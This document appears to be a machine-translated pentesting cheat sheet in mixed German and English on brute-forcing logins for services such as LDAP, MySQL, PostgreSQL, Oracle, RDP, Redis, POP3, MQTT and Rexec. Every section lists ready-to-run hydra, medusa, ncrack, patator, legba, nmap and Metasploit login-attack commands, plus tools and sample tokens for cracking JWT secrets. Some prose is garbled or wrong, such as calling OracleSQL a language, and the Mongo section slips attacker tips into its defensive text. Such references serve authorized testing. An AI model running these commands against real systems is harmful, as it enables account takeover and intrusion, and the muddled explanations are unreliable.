IRC (Internet Relay Chat) ist ein Protokoll für textbasierte Kommunikation in Echtzeit. Es ermöglicht Benutzern, in Chatrooms zu interagieren und private Nachrichten auszutauschen. IRC wird häufig von Hackern und Sicherheitsexperten genutzt, um Informationen auszutauschen und zu diskutieren. Es gibt verschiedene IRC-Clients, die verwendet werden können, um eine Verbindung zu IRC-Servern herzustellen und an Chats teilzunehmen. Einige beliebte IRC-Clients sind HexChat, irssi und mIRC. Beim Hacken kann IRC verwendet werden, um Informationen über Schwachstellen, Exploits und andere relevante Themen zu erhalten. Es ist wichtig, sich bewusst zu sein, dass die Teilnahme an IRC-Chats mit Vorsicht erfolgen sollte, da nicht alle Informationen vertrauenswürdig sind und es auch Risiken von Malware und Phishing geben kann.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI (Internet Small Computer System Interface) ist ein Netzwerkprotokoll, das es ermöglicht, SCSI-Befehle über IP-Netzwerke zu übertragen. Es ermöglicht die Verbindung von Speichergeräten über das Netzwerk, wodurch eine zentrale Speicherlösung für mehrere Systeme geschaffen wird.

#### Brute-Force-Angriff auf iSCSI

Ein Brute-Force-Angriff auf iSCSI beinhaltet das systematische Ausprobieren aller möglichen Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf ein iSCSI-Target zu erlangen. Dieser Angriff kann verwendet werden, um Schwachstellen in der Authentifizierung zu identifizieren und Zugriff auf sensible Daten zu erlangen.

#### Tools für Brute-Force-Angriffe auf iSCSI

Es gibt verschiedene Tools, die für Brute-Force-Angriffe auf iSCSI verwendet werden können, darunter:

- Hydra: Ein leistungsstarkes Tool für Brute-Force-Angriffe, das verschiedene Protokolle unterstützt, einschließlich iSCSI.
- Medusa: Ein weiteres Tool für Brute-Force-Angriffe, das iSCSI-Targets unterstützt.
- Ncrack: Ein Netzwerk-Authentifizierung-Cracking-Tool, das auch für iSCSI-Brute-Force-Angriffe verwendet werden kann.

#### Schutz vor Brute-Force-Angriffen auf iSCSI

Um sich vor Brute-Force-Angriffen auf iSCSI zu schützen, sollten folgende Maßnahmen ergriffen werden:

- Verwenden Sie starke, eindeutige Passwörter für iSCSI-Targets.
- Begrenzen Sie die Anzahl der zulässigen Anmeldeversuche.
- Aktivieren Sie die Protokollierung von Anmeldeversuchen, um verdächtige Aktivitäten zu erkennen.
- Implementieren Sie eine Zwei-Faktor-Authentifizierung für iSCSI-Targets, um die Sicherheit weiter zu erhöhen.

Durch die Umsetzung dieser Schutzmaßnahmen können Brute-Force-Angriffe auf iSCSI effektiv verhindert oder abgewehrt werden.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
JSON Web Tokens (JWTs) sind eine weit verbreitete Methode zur Authentifizierung und Autorisierung in Webanwendungen. Sie bestehen aus drei Teilen: dem Header, dem Payload und der Signatur.

Der Header enthält Informationen über den verwendeten Algorithmus zur Signaturerstellung. Der Payload enthält die Nutzlastdaten, die Informationen über den Benutzer oder die Anwendung enthalten können. Die Signatur wird verwendet, um die Integrität der Daten sicherzustellen und sicherzustellen, dass sie nicht manipuliert wurden.

Ein häufiger Angriffsvektor gegen JWTs ist der Brute-Force-Angriff. Bei diesem Angriff versucht ein Angreifer, die geheime Signaturschlüssel zu erraten, indem er verschiedene Kombinationen ausprobiert. Dies kann durch automatisierte Tools oder Skripte erfolgen, die eine große Anzahl von Anfragen mit verschiedenen Schlüsselkombinationen senden.

Um Brute-Force-Angriffe auf JWTs zu verhindern, sollten starke und zufällige Signaturschlüssel verwendet werden. Es wird auch empfohlen, die Anzahl der Versuche pro Zeiteinheit zu begrenzen und Sicherheitsmaßnahmen wie Captchas oder Zwei-Faktor-Authentifizierung zu implementieren.

Es ist wichtig zu beachten, dass Brute-Force-Angriffe nicht nur auf JWTs beschränkt sind, sondern auf verschiedene Bereiche der IT-Sicherheit anwendbar sind. Es ist daher ratsam, allgemeine Sicherheitspraktiken zu befolgen, um solche Angriffe zu verhindern.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) ist ein Protokoll, das zur Verwaltung und Abfrage von Verzeichnisdiensten verwendet wird. Es ermöglicht den Zugriff auf Informationen in einem Verzeichnis, wie z.B. Benutzerkonten, Gruppen und Ressourcen. LDAP kann für verschiedene Zwecke eingesetzt werden, einschließlich der Authentifizierung von Benutzern und der Suche nach Informationen in einem Verzeichnis.

#### Brute-Force-Angriff auf LDAP

Ein Brute-Force-Angriff auf LDAP beinhaltet das systematische Ausprobieren verschiedener Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf ein LDAP-Verzeichnis zu erlangen. Dieser Angriff kann durchgeführt werden, wenn keine ausreichenden Sicherheitsvorkehrungen getroffen wurden, um die Anzahl der fehlgeschlagenen Anmeldeversuche zu begrenzen.

Um einen Brute-Force-Angriff auf LDAP durchzuführen, können verschiedene Tools und Skripte verwendet werden, die automatisch Benutzernamen und Passwörter ausprobieren. Es ist wichtig, eine Liste mit häufig verwendeten Benutzernamen und Passwörtern zu erstellen und diese in den Angriff einzubeziehen. Darüber hinaus können Wörterbuchangriffe verwendet werden, bei denen eine Liste häufig verwendeter Wörter als potenzielle Passwörter ausprobiert wird.

Es ist wichtig zu beachten, dass ein Brute-Force-Angriff auf LDAP illegal ist, es sei denn, er wird im Rahmen einer autorisierten Penetrationstest durchgeführt. Es ist wichtig, die Zustimmung des Eigentümers des LDAP-Verzeichnisses einzuholen, bevor ein solcher Angriff durchgeführt wird.

#### Schutz vor Brute-Force-Angriffen auf LDAP

Um sich vor Brute-Force-Angriffen auf LDAP zu schützen, können verschiedene Maßnahmen ergriffen werden:

- Implementierung von Sicherheitsvorkehrungen wie Kontosperrungen nach einer bestimmten Anzahl fehlgeschlagener Anmeldeversuche.
- Verwendung starker Passwörter, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen.
- Überwachung der Anmeldeaktivitäten und Erkennung verdächtiger Muster.
- Aktualisierung des LDAP-Servers und der verwendeten Software, um bekannte Sicherheitslücken zu schließen.
- Verwendung von Zwei-Faktor-Authentifizierung, um die Sicherheit der Anmeldung weiter zu erhöhen.

Durch die Implementierung dieser Schutzmaßnahmen kann das Risiko eines erfolgreichen Brute-Force-Angriffs auf LDAP erheblich reduziert werden. Es ist wichtig, regelmäßig Sicherheitsüberprüfungen durchzuführen und sicherzustellen, dass alle Sicherheitsvorkehrungen auf dem neuesten Stand sind.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

MQTT (Message Queuing Telemetry Transport) ist ein leichtgewichtiges Protokoll, das für die Kommunikation zwischen Geräten mit begrenzter Bandbreite und hoher Latenz entwickelt wurde. Es basiert auf dem Publish-Subscribe-Muster, bei dem Geräte als Publisher Nachrichten an ein zentrales System senden und als Subscriber Nachrichten von diesem System empfangen können.

Das Protokoll verwendet TCP/IP als Transportprotokoll und ermöglicht eine zuverlässige und effiziente Übertragung von Nachrichten. MQTT ist besonders für IoT-Anwendungen geeignet, da es wenig Ressourcen benötigt und eine geringe Netzwerkbandbreite verbraucht.

Ein Brute-Force-Angriff auf MQTT kann verwendet werden, um Benutzernamen und Passwörter zu erraten und sich unbefugten Zugriff auf das System zu verschaffen. Dies kann durch systematisches Ausprobieren verschiedener Kombinationen von Benutzernamen und Passwörtern erreicht werden, bis die richtigen Zugangsdaten gefunden werden.

Es gibt verschiedene Tools und Techniken, die für einen Brute-Force-Angriff auf MQTT verwendet werden können. Dazu gehören Skripte wie Mosquito-Password-Cracker und MQTT-Brute, die speziell für diesen Zweck entwickelt wurden.

Es ist wichtig zu beachten, dass Brute-Force-Angriffe illegal sind und nur mit ausdrücklicher Genehmigung des Eigentümers des Systems durchgeführt werden dürfen. Es ist auch ratsam, starke Passwörter zu verwenden und Sicherheitsvorkehrungen wie Zwei-Faktor-Authentifizierung zu implementieren, um Brute-Force-Angriffe zu verhindern.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo

Mongo ist eine dokumentenorientierte NoSQL-Datenbank, die häufig in Webanwendungen verwendet wird. Es ist wichtig zu beachten, dass Mongo standardmäßig keine Authentifizierung aktiviert hat, was bedeutet, dass es anfällig für Brute-Force-Angriffe sein kann.

#### Brute-Force-Angriff auf Mongo

Ein Brute-Force-Angriff auf Mongo beinhaltet das systematische Ausprobieren verschiedener Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf die Datenbank zu erlangen. Dies kann durch automatisierte Skripte oder Tools wie Hydra oder Medusa durchgeführt werden.

Um einen Brute-Force-Angriff auf Mongo durchzuführen, müssen Sie zunächst eine Liste potenzieller Benutzernamen und Passwörter erstellen. Diese Liste kann aus gebräuchlichen Kombinationen, Wörterbuchwörtern oder anderen bekannten Informationen bestehen.

Sobald Sie Ihre Liste haben, können Sie ein Brute-Force-Tool verwenden, um die Kombinationen auszuprobieren. Stellen Sie sicher, dass Sie das Tool richtig konfigurieren, um die Anzahl der Versuche pro Sekunde zu begrenzen und Sperren zu vermeiden.

Es ist auch wichtig, die Anmeldeversuche zu überwachen, um verdächtige Aktivitäten zu erkennen. Wenn Sie feststellen, dass ein Brute-Force-Angriff stattfindet, können Sie Maßnahmen ergreifen, um den Angriff zu stoppen, wie z.B. das Blockieren der IP-Adresse des Angreifers.

#### Schutz vor Brute-Force-Angriffen auf Mongo

Um sich vor Brute-Force-Angriffen auf Mongo zu schützen, gibt es mehrere Maßnahmen, die Sie ergreifen können:

- Aktivieren Sie die Authentifizierung in Mongo, um sicherzustellen, dass nur autorisierte Benutzer auf die Datenbank zugreifen können.
- Verwenden Sie starke Passwörter für Ihre Benutzerkonten und ändern Sie sie regelmäßig.
- Begrenzen Sie die Anzahl der Anmeldeversuche pro Sekunde, um Brute-Force-Angriffe zu erschweren.
- Überwachen Sie die Anmeldeversuche und setzen Sie Mechanismen ein, um verdächtige Aktivitäten zu erkennen.
- Aktualisieren Sie regelmäßig Ihre Mongo-Installation, um bekannte Sicherheitslücken zu schließen.

Durch die Implementierung dieser Schutzmaßnahmen können Sie das Risiko von Brute-Force-Angriffen auf Ihre Mongo-Datenbank verringern.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

MSSQL (Microsoft SQL Server) ist ein relationales Datenbankverwaltungssystem, das von Microsoft entwickelt wurde. Es wird häufig in Unternehmen und Organisationen eingesetzt, um Daten zu speichern und abzurufen. 

#### Brute-Force-Angriff auf MSSQL

Ein Brute-Force-Angriff auf MSSQL beinhaltet das systematische Ausprobieren aller möglichen Passwortkombinationen, um Zugriff auf ein MSSQL-Datenbankkonto zu erlangen. Dieser Angriff kann durchgeführt werden, wenn der Angreifer Zugriff auf den MSSQL-Server hat und versucht, sich mit einem Benutzernamen und einem Passwort anzumelden.

Um einen Brute-Force-Angriff auf MSSQL durchzuführen, können verschiedene Tools und Skripte verwendet werden, die automatisierte Passwortkombinationen ausprobieren. Es ist wichtig zu beachten, dass ein erfolgreicher Brute-Force-Angriff viel Zeit in Anspruch nehmen kann, da die Anzahl der möglichen Passwortkombinationen sehr groß ist.

Es gibt jedoch einige Möglichkeiten, einen Brute-Force-Angriff auf MSSQL zu verhindern. Dazu gehören das Festlegen starker Passwörter für MSSQL-Konten, das Aktivieren von Kontosperrungen nach einer bestimmten Anzahl von fehlgeschlagenen Anmeldeversuchen und das Überwachen von Anmeldeversuchen auf verdächtige Aktivitäten.

Es ist auch wichtig, regelmäßig Sicherheitsupdates für MSSQL zu installieren, um bekannte Schwachstellen zu beheben und potenzielle Angriffsvektoren zu minimieren. Durch die Implementierung einer umfassenden Sicherheitsstrategie können Unternehmen und Organisationen ihre MSSQL-Datenbanken vor Brute-Force-Angriffen schützen.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL ist ein Open-Source-Relationales-Datenbankverwaltungssystem (RDBMS), das häufig für die Speicherung und Verwaltung von Daten in Webanwendungen verwendet wird. Es ist bekannt für seine Geschwindigkeit, Zuverlässigkeit und Skalierbarkeit.

#### Brute-Force-Angriffe auf MySQL

Brute-Force-Angriffe auf MySQL sind eine gängige Methode, um Zugriff auf ein MySQL-Datenbankkonto zu erlangen. Bei einem Brute-Force-Angriff versucht ein Angreifer, sich durch Ausprobieren verschiedener Kombinationen von Benutzernamen und Passwörtern Zugang zu einem Konto zu verschaffen.

Es gibt verschiedene Tools und Techniken, die bei Brute-Force-Angriffen auf MySQL verwendet werden können. Einige der beliebtesten sind:

- **Hydra**: Ein leistungsstarkes Tool zum Brute-Forcen von Benutzernamen und Passwörtern. Es unterstützt verschiedene Protokolle, einschließlich MySQL.

- **Medusa**: Ein weiteres Tool zum Brute-Forcen von Benutzernamen und Passwörtern. Es kann für verschiedene Dienste, einschließlich MySQL, verwendet werden.

- **Wordlist**: Eine Liste von häufig verwendeten Benutzernamen und Passwörtern, die bei Brute-Force-Angriffen verwendet werden können.

Um sich vor Brute-Force-Angriffen auf MySQL zu schützen, sollten Sie starke und eindeutige Passwörter verwenden, die schwer zu erraten sind. Darüber hinaus können Sie auch Sicherheitsmaßnahmen wie die Begrenzung der Anzahl der Anmeldeversuche implementieren oder den Zugriff auf MySQL nur aus vertrauenswürdigen IP-Adressen zulassen.

Es ist auch wichtig, regelmäßig die MySQL-Protokolle zu überprüfen, um verdächtige Aktivitäten zu erkennen und entsprechende Maßnahmen zu ergreifen, um Ihr System zu schützen.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

OracleSQL ist eine relationale Datenbankverwaltungssprache, die von Oracle Corporation entwickelt wurde. Sie wird häufig für die Verwaltung und Abfrage von Datenbanken verwendet. OracleSQL bietet eine Vielzahl von Funktionen und Befehlen, die es Benutzern ermöglichen, auf Daten zuzugreifen, sie zu manipulieren und Abfragen durchzuführen.

#### Brute-Force-Angriffe auf Oracle-Datenbanken

Brute-Force-Angriffe sind eine Methode, bei der ein Angreifer versucht, sich Zugang zu einem System zu verschaffen, indem er systematisch alle möglichen Kombinationen von Benutzernamen und Passwörtern ausprobiert. Bei Oracle-Datenbanken können Brute-Force-Angriffe verwendet werden, um sich Zugang zu einem Konto zu verschaffen, indem sie verschiedene Kombinationen von Benutzernamen und Passwörtern ausprobieren.

Es gibt verschiedene Tools und Techniken, die bei Brute-Force-Angriffen auf Oracle-Datenbanken eingesetzt werden können. Einige dieser Tools sind:

- Hydra: Ein leistungsstarkes Tool, das für Brute-Force-Angriffe auf verschiedene Protokolle und Dienste verwendet werden kann, einschließlich Oracle-Datenbanken.
- Metasploit: Eine umfassende Plattform für Penetrationstests, die auch Brute-Force-Angriffe auf Oracle-Datenbanken unterstützt.
- Nmap: Ein Netzwerk-Scanning-Tool, das auch für Brute-Force-Angriffe auf Oracle-Datenbanken verwendet werden kann.

Es ist wichtig zu beachten, dass Brute-Force-Angriffe illegal sind, es sei denn, sie werden im Rahmen eines autorisierten Penetrationstests durchgeführt. Es ist wichtig, die Zustimmung des Eigentümers des Systems einzuholen, bevor man solche Angriffe durchführt.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Um **oracle\_login** mit **patator** zu verwenden, müssen Sie Folgendes **installieren**:
```bash
pip3 install cx_Oracle --upgrade
```
[Offline OracleSQL Hash-Brute-Force](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**Versionen 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** und **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
POP steht für Post Office Protocol und ist ein Protokoll, das zum Abrufen von E-Mails von einem E-Mail-Server verwendet wird. Es gibt zwei Versionen von POP: POP2 und POP3. POP3 ist die am häufigsten verwendete Version und bietet erweiterte Funktionen im Vergleich zu POP2. Beim Brute-Forcing von POP3-Servern versucht ein Angreifer, sich Zugriff auf das E-Mail-Konto zu verschaffen, indem er verschiedene Kombinationen von Benutzernamen und Passwörtern ausprobiert. Dies kann durch den Einsatz von Tools wie Hydra oder Medusa automatisiert werden. Es ist wichtig zu beachten, dass Brute-Force-Angriffe illegal sind, es sei denn, sie werden im Rahmen einer autorisierten Penetrationstest durchgeführt.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL ist ein leistungsstarkes relationales Datenbankmanagementsystem (RDBMS), das eine Vielzahl von Funktionen und Erweiterungen bietet. Es wird häufig in Webanwendungen und anderen datenintensiven Anwendungen eingesetzt.

#### Brute-Force-Angriffe auf PostgreSQL

Brute-Force-Angriffe auf PostgreSQL sind eine Methode, um sich Zugang zu einem PostgreSQL-Datenbankserver zu verschaffen, indem man systematisch verschiedene Kombinationen von Benutzernamen und Passwörtern ausprobiert, bis man die richtige Kombination findet.

##### Tools für Brute-Force-Angriffe auf PostgreSQL

Es gibt verschiedene Tools, die für Brute-Force-Angriffe auf PostgreSQL verwendet werden können. Einige der beliebtesten sind:

- Hydra: Ein leistungsstarkes Tool für Brute-Force-Angriffe, das verschiedene Protokolle unterstützt, einschließlich PostgreSQL.
- Medusa: Ein weiteres Tool für Brute-Force-Angriffe, das auf Geschwindigkeit und Effizienz ausgelegt ist.
- Patator: Ein flexibles und erweiterbares Tool für Brute-Force-Angriffe, das PostgreSQL unterstützt.

##### Schutzmaßnahmen gegen Brute-Force-Angriffe auf PostgreSQL

Um sich vor Brute-Force-Angriffen auf PostgreSQL zu schützen, können folgende Maßnahmen ergriffen werden:

- Verwenden Sie starke Passwörter: Verwenden Sie komplexe Passwörter, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen.
- Begrenzen Sie die Anzahl der Anmeldeversuche: Begrenzen Sie die Anzahl der fehlgeschlagenen Anmeldeversuche, um Brute-Force-Angriffe zu erschweren.
- Aktivieren Sie die Zwei-Faktor-Authentifizierung: Durch die Aktivierung der Zwei-Faktor-Authentifizierung wird ein zusätzlicher Sicherheitsschritt hinzugefügt, der Brute-Force-Angriffe erschwert.
- Überwachen Sie die Anmeldeaktivität: Überwachen Sie die Anmeldeaktivität auf verdächtige Muster oder ungewöhnliche Aktivitäten.

##### Fazit

Brute-Force-Angriffe auf PostgreSQL können eine ernsthafte Bedrohung darstellen, aber durch die Implementierung geeigneter Schutzmaßnahmen können Sie Ihr PostgreSQL-System sicherer machen.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Sie können das `.deb` Paket zum Installieren von [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) herunterladen.
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol) ist ein Protokoll, das es Benutzern ermöglicht, auf entfernte Computer zuzugreifen und diese zu steuern. Es wird häufig für die Fernverwaltung von Windows-Systemen verwendet.

#### Brute-Force-Angriff auf RDP

Ein Brute-Force-Angriff auf RDP beinhaltet das systematische Ausprobieren verschiedener Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf ein RDP-fähiges System zu erlangen. Dieser Angriff kann automatisiert werden, indem Tools wie Hydra, Medusa oder Crowbar verwendet werden.

#### Schutzmaßnahmen gegen Brute-Force-Angriffe auf RDP

Um sich vor Brute-Force-Angriffen auf RDP zu schützen, können folgende Maßnahmen ergriffen werden:

- Verwendung starker Passwörter: Verwenden Sie komplexe Passwörter, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen.
- Kontosperrung: Aktivieren Sie die Kontosperrung nach einer bestimmten Anzahl fehlgeschlagener Anmeldeversuche, um Brute-Force-Angriffe zu erschweren.
- Netzwerksegmentierung: Trennen Sie RDP-fähige Systeme von anderen Netzwerken, um die Ausbreitung von Angriffen zu begrenzen.
- Zwei-Faktor-Authentifizierung: Aktivieren Sie die Zwei-Faktor-Authentifizierung, um zusätzliche Sicherheitsschichten bereitzustellen.
- Aktualisierung und Patching: Stellen Sie sicher, dass das RDP-System auf dem neuesten Stand ist und alle verfügbaren Sicherheitspatches installiert sind.

#### Erkennung von Brute-Force-Angriffen auf RDP

Um Brute-Force-Angriffe auf RDP zu erkennen, können folgende Techniken angewendet werden:

- Überwachung der Anmeldeversuche: Überwachen Sie die Anmeldeversuche auf RDP-fähigen Systemen und suchen Sie nach verdächtigen Aktivitäten, wie z.B. wiederholte fehlgeschlagene Anmeldeversuche.
- Protokollierung: Aktivieren Sie die Protokollierung von RDP-Anmeldeversuchen, um verdächtige Aktivitäten zu identifizieren.
- Intrusion Detection System (IDS): Implementieren Sie ein IDS, um verdächtige Netzwerkaktivitäten zu erkennen und darauf zu reagieren.

#### Gegenmaßnahmen gegen Brute-Force-Angriffe auf RDP

Wenn ein Brute-Force-Angriff auf RDP erkannt wird, können folgende Gegenmaßnahmen ergriffen werden:

- Sperrung des Angreifers: Blockieren Sie die IP-Adresse des Angreifers, um weitere Angriffsversuche zu verhindern.
- Änderung der Standard-RDP-Portnummer: Ändern Sie die Standard-RDP-Portnummer, um automatisierte Angriffe zu erschweren.
- Aktualisierung der Sicherheitsrichtlinien: Überprüfen und aktualisieren Sie die Sicherheitsrichtlinien für RDP, um die Sicherheit zu verbessern.
- Überprüfung der Konten: Überprüfen Sie die Konten auf verdächtige Aktivitäten und ändern Sie die Passwörter, falls erforderlich.

#### Fazit

Brute-Force-Angriffe auf RDP sind eine ernsthafte Bedrohung für die Sicherheit von Systemen. Durch die Implementierung geeigneter Schutzmaßnahmen und Überwachungstechniken können diese Angriffe erkannt und abgewehrt werden. Es ist wichtig, die Sicherheit von RDP-Systemen regelmäßig zu überprüfen und auf dem neuesten Stand zu halten, um potenzielle Schwachstellen zu minimieren.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis ist eine Open-Source-Datenbank, die als In-Memory-Datenstrukturdatenbank verwendet wird. Sie unterstützt verschiedene Datentypen wie Strings, Listen, Sets, Hashes und mehr. Redis bietet auch die Möglichkeit, Skripte in Lua auszuführen und verfügt über eine integrierte Replikation und Failover-Funktion.

#### Brute-Force-Angriffe auf Redis

Brute-Force-Angriffe auf Redis beinhalten das systematische Ausprobieren von verschiedenen Kombinationen von Benutzernamen und Passwörtern, um sich Zugang zu einem Redis-Server zu verschaffen. Diese Angriffe können durchgeführt werden, wenn der Redis-Server nicht ordnungsgemäß konfiguriert ist und keine ausreichenden Sicherheitsvorkehrungen getroffen wurden.

#### Methoden zur Verhinderung von Brute-Force-Angriffen auf Redis

Es gibt verschiedene Methoden, um Brute-Force-Angriffe auf Redis zu verhindern:

1. Verwenden Sie starke Passwörter: Verwenden Sie komplexe und eindeutige Passwörter für den Zugriff auf den Redis-Server. Vermeiden Sie gängige Passwörter oder einfache Kombinationen.

2. Aktivieren Sie die Authentifizierung: Aktivieren Sie die Authentifizierung auf dem Redis-Server, um sicherzustellen, dass nur autorisierte Benutzer Zugriff haben. Verwenden Sie ein starkes Passwort für die Authentifizierung.

3. Begrenzen Sie den Zugriff: Begrenzen Sie den Zugriff auf den Redis-Server auf vertrauenswürdige IP-Adressen oder Netzwerke. Verwenden Sie Firewall-Regeln oder andere Sicherheitsmechanismen, um den Zugriff einzuschränken.

4. Überwachen Sie die Protokolle: Überwachen Sie die Protokolle des Redis-Servers auf verdächtige Aktivitäten. Achten Sie auf wiederholte fehlgeschlagene Anmeldeversuche oder ungewöhnliche Zugriffsversuche.

5. Aktualisieren Sie Redis: Stellen Sie sicher, dass Sie die neueste Version von Redis verwenden, da diese regelmäßig Sicherheitsupdates enthält. Aktualisieren Sie den Redis-Server, um bekannte Sicherheitslücken zu schließen.

Durch die Implementierung dieser Maßnahmen können Sie die Sicherheit Ihres Redis-Servers verbessern und Brute-Force-Angriffe verhindern.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec is a remote execution service that allows users to execute commands on a remote system. It is commonly used for administrative purposes, such as managing multiple systems from a central location. However, it can also be exploited by hackers to gain unauthorized access to a remote system.

One common method used to exploit Rexec is through brute force attacks. Brute force attacks involve systematically trying all possible combinations of usernames and passwords until the correct credentials are found. This can be a time-consuming process, but it can be effective if the target system has weak or easily guessable credentials.

To perform a brute force attack on Rexec, you will need a list of possible usernames and passwords. There are many tools available that can automate this process, such as Hydra or Medusa. These tools allow you to specify a list of usernames and passwords, and they will automatically try each combination until the correct credentials are found.

It is important to note that brute force attacks are illegal and unethical unless you have explicit permission from the system owner to perform them. Unauthorized access to computer systems is a serious offense and can result in criminal charges.

If you are a system administrator, it is important to ensure that your Rexec service is properly secured to prevent unauthorized access. This includes using strong, unique passwords for all user accounts, implementing account lockouts after a certain number of failed login attempts, and regularly monitoring logs for any suspicious activity.

By following these best practices, you can help protect your system from brute force attacks and maintain the security of your Rexec service.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin is a remote login protocol that allows users to log into a remote system over a network. It is commonly used in Unix-based systems. Rlogin uses the TCP port 513.

#### Brute Forcing Rlogin

To perform a brute force attack on Rlogin, you can use tools like Hydra or Medusa. These tools allow you to automate the process of trying different username and password combinations until a successful login is found.

Here is an example command using Hydra to brute force Rlogin:

```plaintext
hydra -l <username> -P <password_list> rlogin://<target_ip>
```

